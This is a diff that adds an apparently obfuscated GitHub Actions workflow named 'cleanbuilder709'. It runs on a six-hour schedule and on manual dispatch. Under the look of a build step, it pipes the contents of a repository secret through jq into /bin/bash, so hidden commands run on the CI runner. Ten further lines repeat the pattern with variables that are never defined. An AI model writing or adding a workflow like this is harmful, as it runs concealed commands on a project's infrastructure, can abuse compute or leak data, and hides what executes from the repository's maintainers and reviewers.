@@ -1,0 +1,29 @@
+name: cleanbuilder709
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cleanbuilder709
+        env:
+          ixspw30595: ${{ secrets.ixspw30595 }}
+        run: |
+          echo $ixspw30595 | jq -r .rr908 | /bin/bash
+          echo $wh85770 | jq -r .vnjh315 | /bin/bash
+          echo $nfxl6480 | jq -r .xx66503 | /bin/bash
+          echo $wqyob45 | jq -r .kror26 | /bin/bash
+          echo $qz153 | jq -r .qzfy4 | /bin/bash
+          echo $bfev91 | jq -r .vu0858 | /bin/bash
+          echo $arc9 | jq -r .fto15 | /bin/bash
+          echo $hko241 | jq -r .jyize794 | /bin/bash
+          echo $g5851 | jq -r .uugfo24870 | /bin/bash
+          echo $yfa15 | jq -r .wa3009 | /bin/bash
+          echo $kmds66 | jq -r .ndrjo180 | /bin/bash
+
